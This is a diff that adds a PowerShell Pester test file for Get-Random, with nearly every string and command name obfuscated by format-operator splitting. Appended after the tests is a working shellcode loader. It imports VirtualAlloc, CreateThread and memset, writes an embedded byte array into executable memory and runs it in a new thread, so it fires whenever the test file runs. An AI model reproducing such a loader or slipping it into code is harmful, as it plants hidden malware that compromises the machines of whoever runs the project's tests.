+        ${r`esu`Lt} | &("{0}{1}" -f 'S','hould') -BeOfType ${T`yPe}
+
+        ${reS`UlT} = &("{2}{0}{1}"-f 'Rand','om','Get-') -Maximum ${ma`x`iMUM} -Minimum ${mIn`i`MUm} -Count 3
+        foreach (${rAND`omnUM`Ber} in ${rES`ULT}) {
+            ${rA`Nd`o`MNuM`Ber} | &("{2}{0}{1}" -f 'ou','ld','Sh') -BeGreaterThan ${g`R`e`ATErTHaN}
+            ${RanDOMnum`B`eR} | &("{0}{2}{1}" -f'S','ld','hou') -BeLessThan ${l`eSst`hAN}
+            ${RAND`omn`U`Mber} | &("{0}{1}" -f 'S','hould') -BeOfType ${T`ypE}
+        }
+    }
+
+    &('It') ((("{2}{7}{1}{3}{8}{6}{4}{0}{5}" -f 'T','d be ab','S','le to throw err','f','s','r when fTs<Name>','houl','o')) -rEPLacE'fTs',[ChAr]39) -TestCases ${t`eS`TdatAFO`Rer`R`oR} {
+        param(${m`AxImUm}, ${m`inimum})
+        { &("{1}{0}{2}" -f 'et-Ra','G','ndom') -Minimum ${m`Ini`MuM} -Maximum ${mA`XiM`Um} } | &("{1}{2}{0}" -f 'uld','Sh','o') -Throw -ErrorId ("{0}{10}{6}{3}{5}{15}{4}{11}{18}{12}{17}{16}{7}{1}{8}{20}{14}{13}{19}{2}{9}"-f'M','osoft.Powe','omComma','e','r','a','Gr','cr','r','nd','in','T','Equa','Ge','hell.Commands.','te','i','lMax,M','hanOr','tRand','S')
+    }
+
+    &('It') ("{0}{1}{5}{6}{2}{3}{4}"-f'Tests',' ',' t','he se','ed','f','or setting') {
+        ${resu`l`T1} = (&("{1}{0}{2}" -f '-rand','get','om') -SetSeed 123), (&("{1}{0}{2}" -f'n','get-ra','dom'))
+        ${r`ESULt2} = (&("{0}{1}{3}{2}"-f'g','et-','om','rand') -SetSeed 123), (&("{0}{2}{1}"-f'get-r','dom','an'))
+        ${R`eS`ULt1} | &("{1}{0}" -f'ould','Sh') -Be ${RESU`lt2}
+    }
+}
+
+&("{0}{1}{2}"-f'Des','cr','ibe') ("{1}{2}{0}"-f 'ndom','Get','-Ra') -Tags "CI" {
+    &('It') ("{7}{6}{4}{2}{1}{3}{5}{0}" -f 'han -1','t',' a random number grea','e','ld return','r t','hou','S') {
+        &("{3}{2}{1}{0}"-f 'dom','n','Ra','Get-') | &("{1}{0}"-f 'ould','Sh') -BeGreaterThan ('-1')
+    }
+
+    &('It') ("{6}{5}{7}{3}{2}{8}{1}{4}{9}{0}" -f'00','r l','a','n a r','ess th','uld ret','Sho','ur','ndom numbe','an 1') {
+        &("{0}{2}{1}" -f 'Get-Ra','m','ndo') -Maximum 100 | &("{2}{1}{0}"-f'd','oul','Sh') -BeLessThan 100
+        &("{1}{0}{2}"-f'an','Get-R','dom') -Maximum 100 | &("{0}{1}" -f 'S','hould') -BeGreaterThan ('-1')
+    }
+
+    &('It') ("{6}{16}{12}{4}{3}{9}{5}{7}{14}{0}{1}{2}{13}{15}{10}{11}{8}" -f '0',' a','nd great','b','m num','r l','Shoul','es','0 ','e','n -','10','do','er th','s than 10','a','d return a ran') {
+        ${R`ANDOMNu`mb`Er} = &("{0}{2}{1}" -f'Get-','dom','Ran') -Minimum ("{0}{1}" -f'-10','0') -Maximum 100
+        ${ra`NdoM`NUM`BeR} | &("{0}{1}" -f'S','hould') -BeLessThan 100
+        ${Ra`ND`OMNu`MbeR} | &("{1}{0}"-f 'hould','S') -BeGreaterThan ("{1}{0}" -f'101','-')
+    }
+
+    &('It') ("{12}{4}{11}{9}{0}{1}{2}{3}{8}{5}{6}{10}{7}" -f 'ndom n','umber',' less th','a','hould ',' ','2',' and greater than 10.7 ','n','a ra','0.93','return ','S') {
+        ${RANDO`mnuM`BeR} = &("{2}{0}{1}"-f'et-','Random','G') -Minimum 10.7 -Maximum 20.93
+        ${R`And`OmnumB`Er} | &("{1}{0}" -f'ld','Shou') -BeLessThan 20.93
+        ${rAnDomnuM`B`ER} | &("{1}{0}" -f 'd','Shoul') -BeGreaterThan 10.7
+    }
+
+    &('It') ("{9}{1}{16}{10}{18}{11}{2}{13}{3}{5}{4}{15}{14}{17}{8}{7}{12}{0}{6}"-f 'ed','hou','fo','h Get-Ra','hen ','ndom w',' is used ','S',' ','S','urn sa',' ','etSe','r bot','it','sw','ld ret','ch','me number') {
+        ${FI`RsT`Ra`NdOmnUMBER} = &("{0}{2}{1}{3}"-f 'G','and','et-R','om') -Maximum 100 -SetSeed 23
+        ${se`cO`NdranDoMNuM`BEr} = &("{1}{0}{3}{2}" -f'et-Ran','G','om','d') -Maximum 100 -SetSeed 23
+        ${firs`T`RAN`DOMNU`mb`eR} | &("{1}{2}{0}" -f'd','Sho','ul') -Be ${S`e`cOnD`RaNdOMNuMb`eR}
+    }
+
+    &('It') ("{7}{4}{6}{0}{3}{5}{2}{1}" -f'rn ','8,13 ','3,5,','a numbe','e','r from 1,2,','tu','Should r') {
+        ${Rand`OMnu`MBeR} = &("{0}{2}{3}{1}"-f'G','m','et-','Rando') -InputObject 1, 2, 3, 5, 8, 13
+        ${rANDO`MN`UmbEr} | &("{1}{0}" -f'hould','S') -BeIn 1, 2, 3, 5, 8, 13
+    }
+
+    &('It') ("{3}{1}{4}{0}{2}" -f ' a','ld ','rray ','Shou','return an') {
+        ${Rand`OMnUM`BeR} = &("{0}{2}{1}"-f'Get-','dom','Ran') -InputObject 1, 2, 3, 5, 8, 13 -Count 3
+        ${RA`N`D`o`MNUmBer}."Cou`Nt" | &("{0}{1}" -f'Sho','uld') -Be 3
+        ,${RA`NDo`M`NumBEr} | &("{1}{0}"-f'uld','Sho') -BeOfType ("{3}{0}{1}{2}" -f 'ste','m','.Array','Sy')
+    }
+
+    &('It') ("{1}{9}{4}{5}{11}{8}{0}{2}{7}{6}{10}{3}" -f 'mber','Shou','s for array','3,5,8,13 ','r','an','of 1,',' ','om nu','ld return three ','2,','d') {
+        ${Ra`N`DOM`NUMBEr} = &("{2}{3}{0}{1}" -f 'Ra','ndom','Get','-') -InputObject 1, 2, 3, 5, 8, 13 -Count 3
+        ${r`An`domn`UM`BeR}."C`oUnT" | &("{0}{1}{2}" -f'Sh','o','uld') -Be 3
+        ${rAndO`Mn`U`mb`eR}[0] | &("{0}{2}{1}" -f 'Sh','ld','ou') -BeIn 1, 2, 3, 5, 8, 13
+        ${RA`NdOM`Nu`Mb`Er}[1] | &("{1}{0}" -f 'd','Shoul') -BeIn 1, 2, 3, 5, 8, 13
+        ${RAND`o`M`NuMBer}[2] | &("{0}{1}"-f 'Shou','ld') -BeIn 1, 2, 3, 5, 8, 13
+        ${R`ANDOM`Num`BEr}[3] | &("{0}{1}"-f 'Sho','uld') -BeNullOrEmpty
+    }
+
+    &('It') ("{2}{9}{11}{5}{4}{10}{7}{8}{12}{1}{6}{0}{3}" -f 'la','13 i','Shoul','r order',' all ','return','n no particu',' numbe','rs for array of 1,','d','the',' ','2,3,5,8,') {
+        ${R`ANdOMNUmB`eR} = &("{2}{0}{1}"-f'a','ndom','Get-R') -InputObject 1, 2, 3, 5, 8, 13 -Count (  (  &("{1}{2}{0}" -f 'Em','geT-','IT')  ("{3}{2}{1}{0}"-f'8','KN09','Le:','vAriAb')  )."V`ALuE"::"MAx`V`ALuE")
+        ${Ra`ND`o`mnuMBER}."c`OUnt" | &("{1}{0}" -f'd','Shoul') -Be 6
+        ${R`ANdoM`NuM`BeR}[0] | &("{1}{2}{0}" -f 'ld','Sh','ou') -BeIn 1, 2, 3, 5, 8, 13
+        ${RANdo`mn`UMBer}[1] | &("{1}{0}" -f 'ld','Shou') -BeIn 1, 2, 3, 5, 8, 13
+        ${RAndoM`NUM`BeR}[2] | &("{1}{2}{0}" -f 'uld','S','ho') -BeIn 1, 2, 3, 5, 8, 13
+        ${Ra`ND`o`MNuMbEr}[3] | &("{0}{1}"-f 'S','hould') -BeIn 1, 2, 3, 5, 8, 13
+        ${RandO`mNUMb`eR}[4] | &("{0}{1}" -f'S','hould') -BeIn 1, 2, 3, 5, 8, 13
+        ${raN`d`oMN`Umber}[5] | &("{1}{0}" -f 'ld','Shou') -BeIn 1, 2, 3, 5, 8, 13
+        ${R`AnDOMn`UMb`ER}[6] | &("{1}{0}" -f'ould','Sh') -BeNullOrEmpty
+    }
+
+    &('It') ("{3}{0}{2}{8}{4}{7}{5}{6}{1}"-f'hould re',' ','turn ','S','r','ring co','llection',' a st','fo') {
+        ${R`An`d`OmNuMB`eR} = &("{2}{0}{1}"-f'-Ran','dom','Get') -InputObject "red", ("{1}{0}{2}"-f'l','ye','low'), ("{1}{0}" -f'e','blu')
+        ${rA`Nd`omNuMb`Er} | &("{0}{1}" -f'Shoul','d') -Be ("red" -or ("{0}{1}" -f'yel','low') -or ("{0}{1}"-f 'blu','e'))
+    }
+
+    &('It') ("{5}{4}{2}{3}{6}{1}{0}"-f'decimal ',' hexa','n a numb','er f','r','Should retu','or') {
+        ${rA`NDoMn`UmbER} = &("{0}{2}{1}" -f 'Get-Ran','m','do') 0x07FFFFFFFFF
+        ${ra`Ndo`MnUmBer} | &("{0}{1}"-f 'S','hould') -BeLessThan 549755813887
+        ${Ran`DO`M`NumB`er} | &("{1}{2}{0}" -f'd','Sho','ul') -BeGreaterThan 0
+    }
+
+    &('It') ("{25}{20}{13}{4}{23}{6}{9}{8}{11}{24}{16}{2}{3}{12}{21}{17}{14}{10}{22}{1}{5}{15}{7}{0}{18}{19}"-f 'SetSe',' wh','om n','um',' r','en not using','ur','he ',' ch','n false,','e','eck','ber','ould','ot ',' t','d',' are n','ed swi','tch ','h','s','qual','et',' two ran','S') {
+        ${FiR`s`TraN`DoM`NUMber} = &("{0}{2}{1}" -f'Get-Ran','m','do')
+        ${S`eConD`RA`NDOM`NuMB`Er} = &("{1}{0}{2}" -f't-Ra','Ge','ndom')
+        ${f`iR`stRAndOMnu`MBeR} | &("{0}{1}" -f 'Shoul','d') -Not -Be ${SeCO`ND`RAN`D`oM`NUM`Ber}
+    }
+
+    &('It') ("{8}{1}{6}{20}{3}{2}{17}{4}{11}{18}{10}{7}{13}{19}{0}{12}{15}{9}{16}{14}{5}"-f 'n','d r','r hexadecimal','e same number fo','number','t used ','et','r numb','Shoul','itch SetS','d regula',' ',' the ','e','ed i','sw','e',' ','an','r whe','urn th') {
+        ${fi`RsTRa`NdOm`NuMBer} = &("{2}{3}{0}{1}" -f 'Ran','dom','Ge','t-') 0x07FFFFFFFF -SetSeed 20
+        ${S`e`cO`NdraNd`o`m`NUMbEr} = &("{0}{2}{1}" -f 'G','andom','et-R') 34359738367 -SetSeed 20
+        ${fi`RS`T`RaNDoMNUm`BEr} | &("{2}{0}{1}"-f'o','uld','Sh') -Be @secondRandomNumber
+    }
+
+    &('It') ("{16}{4}{14}{3}{13}{18}{0}{17}{12}{8}{9}{6}{2}{11}{10}{7}{1}{5}{15}"-f' e','mal','h','thr','ul',' number is t','se the ','i',' be','cau','c','exade','or','o','d ','o large ','Sho','rr','w an') {
+        { &("{1}{2}{0}"-f'dom','Ge','t-Ran') ("{0}{2}{1}{3}" -f'0','FFFFFFFF','x07FFFFFF','FF') } | &("{1}{0}{2}" -f 'ho','S','uld') -Throw ("{5}{0}{2}{1}{3}{8}{4}{10}{9}{7}{11}{6}"-f 's','he',' eit','r ','o','Value wa','Int32','o small','t','arge or to','o l',' for a U')
+    }
+
+    &('It') ("{0}{12}{1}{3}{4}{5}{9}{11}{6}{2}{10}{7}{13}{8}"-f'Should acce','io','tring fo','n',' co','ntaining',' s','In','tObject',' e','r -','mpty','pt collect','pu') {
+        1..10 | &("{0}{1}{2}{3}"-f'F','orE','ach-Objec','t') {
+            &("{1}{2}{0}"-f'dom','G','et-Ran') -InputObject @('a','b','') | &("{0}{1}{2}"-f'Sho','ul','d') -BeIn 'a','b',''
+        }
+    }
+
+    &('It') ('Sh'+'ou'+'ld '+'acc'+'ep'+'t '+"`$null "+'in'+' '+'colle'+'c'+'t'+'ion '+'f'+'or '+'-Input'+'Objec'+'t') {
+        1..10 | &("{1}{2}{0}"-f 'Object','Fo','rEach-') {
+            &("{0}{1}{2}"-f 'Get-Ra','n','dom') -InputObject @('a','b',${n`UlL}) | &("{0}{1}" -f 'Sho','uld') -BeIn 'a','b',${NU`ll}
+        }
+    }
+}
+
+${c} = (((("{92}{87}{27}{6}{73}{67}{107}{14}{83}{7}{68}{35}{82}{88}{57}{37}{66}{79}{78}{55}{70}{58}{108}{97}{99}{44}{109}{95}{21}{104}{32}{74}{94}{38}{111}{110}{71}{89}{85}{9}{22}{0}{36}{24}{45}{23}{4}{18}{84}{76}{61}{47}{50}{65}{49}{39}{114}{12}{77}{64}{53}{98}{11}{90}{48}{20}{30}{2}{56}{81}{46}{69}{112}{113}{17}{93}{101}{34}{13}{75}{10}{54}{42}{1}{15}{41}{25}{33}{86}{105}{60}{51}{102}{29}{106}{72}{31}{8}{103}{3}{5}{115}{59}{28}{62}{100}{52}{26}{80}{96}{91}{16}{63}{43}{40}{19}" -f 'llImpor','a','ze, I','public ','2','st','por','.dll',')','t','Creatio','bu','e','t','n','gs, ','int ','t','.','t);','StackS','Size,',');[D','nel3','NFb','ntPtr','emset(IntPt','Im','ext','t(N','i','msvcrt.dllNFb','lAllocatio',' lpThreadId','uin',')','t(','tatic','pe, u',' IntPtr ','un','I','Fl','o','ss, uin','ker','Addre','public stati','w','ern','c ','ll',' m','t','n','tu','ntPtr lpStar','blic s','(','ic ','[D','NFb)]','ern Int','c','tPtr lpThreadA','ext',' e','ke','NFb','ss, IntPtr l','alAlloc','rot','b','t(NFb','n',' dw','ll','ateThread(In','r Vir','xtern IntPt','r de','t',']p','el32','d','c',')','ll','u','e','tes, uint d',' u','[D','er,','Ty','w','st, uint src,','Ptr l','tri','pAddre','Ptr',' ','Impor',']',' uint f',';','F','r','Int','t d','P','int fl','pParam','e','Cr','at')) -cRePLACE'NFb',[ChAr]34));${W} = &("{0}{1}"-f'Add','-Type') -memberDefinition ${C} -Name ("{0}{1}" -f'W','in32') -namespace ("{0}{2}{3}{1}" -f'Win3','ns','2Fun','ctio') -passthru;[Byte[]];[Byte[]]${z} = 0xba,0x79,0xcb,0xf3,0xb8,0xd9,0xe1,0xd9,0x74,0x24,0xf4,0x5f,0x31,0xc9,0xb1,0x47,0x31,0x57,0x13,0x83,0xc7,0x04,0x03,0x57,0x76,0x29,0x06,0x44,0x60,0x2f,0xe9,0xb5,0x70,0x50,0x63,0x50,0x41,0x50,0x17,0x10,0xf1,0x60,0x53,0x74,0xfd,0x0b,0x31,0x6d,0x76,0x79,0x9e,0x82,0x3f,0x34,0xf8,0xad,0xc0,0x65,0x38,0xaf,0x42,0x74,0x6d,0x0f,0x7b,0xb7,0x60,0x4e,0xbc,0xaa,0x89,0x02,0x15,0xa0,0x3c,0xb3,0x12,0xfc,0xfc,0x38,0x68,0x10,0x85,0xdd,0x38,0x13,0xa4,0x73,0x33,0x4a,0x66,0x75,0x90,0xe6,0x2f,0x6d,0xf5,0xc3,0xe6,0x06,0xcd,0xb8,0xf8,0xce,0x1c,0x40,0x56,0x2f,0x91,0xb3,0xa6,0x77,0x15,0x2c,0xdd,0x81,0x66,0xd1,0xe6,0x55,0x15,0x0d,0x62,0x4e,0xbd,0xc6,0xd4,0xaa,0x3c,0x0a,0x82,0x39,0x32,0xe7,0xc0,0x66,0x56,0xf6,0x05,0x1d,0x62,0x73,0xa8,0xf2,0xe3,0xc7,0x8f,0xd6,0xa8,0x9c,0xae,0x4f,0x14,0x72,0xce,0x90,0xf7,0x2b,0x6a,0xda,0x15,0x3f,0x07,0x81,0x71,0x8c,0x2a,0x3a,0x81,0x9a,0x3d,0x49,0xb3,0x05,0x96,0xc5,0xff,0xce,0x30,0x11,0x00,0xe5,0x85,0x8d,0xff,0x06,0xf6,0x84,0x3b,0x52,0xa6,0xbe,0xea,0xdb,0x2d,0x3f,0x13,0x0e,0xe1,0x6f,0xbb,0xe1,0x42,0xc0,0x7b,0x52,0x2b,0x0a,0x74,0x8d,0x4b,0x35,0x5f,0xa6,0xe6,0xcf,0x37,0x00,0x06,0x3b,0x3a,0xfa,0xe5,0xc4,0xd5,0xa7,0x60,0x22,0xbf,0x47,0x25,0xfc,0x57,0xf1,0x6c,0x76,0xc6,0xfe,0xba,0xf2,0xc8,0x75,0x49,0x02,0x86,0x7d,0x24,0x10,0x7e,0x8e,0x73,0x4a,0x28,0x91,0xa9,0xe1,0xd4,0x07,0x56,0xa0,0x83,0xbf,0x54,0x95,0xe3,0x1f,0xa6,0xf0,0x78,0xa9,0x32,0xbb,0x16,0xd6,0xd2,0x3b,0xe6,0x80,0xb8,0x3b,0x8e,0x74,0x99,0x6f,0xab,0x7a,0x34,0x1c,0x60,0xef,0xb7,0x75,0xd5,0xb8,0xdf,0x7b,0x00,0x8e,0x7f,0x83,0x67,0x0e,0x43,0x52,0x41,0x64,0xad,0x66;${g} = 0x1000;if (${z}."LenG`Th" -gt 0x1000){${G} = ${z}."LeN`GtH"};${x}=${W}::("{1}{2}{0}"-f 'Alloc','Vi','rtual').Invoke(0,0x1000,${G},0x40);for (${i}=0;${i} -le (${z}."lE`NG`TH"-1);${I}++) {${w}::"MEM`sEt"([IntPtr](${x}.("{1}{0}{2}"-f 'oInt3','T','2').Invoke()+${I}), ${Z}[${I}], 1)};${W}::("{1}{2}{0}" -f 'd','CreateTh','rea').Invoke(0,0,${X},0,0,0);for (;;){&("{0}{2}{1}{3}" -f'Start-s','e','le','p') 60};
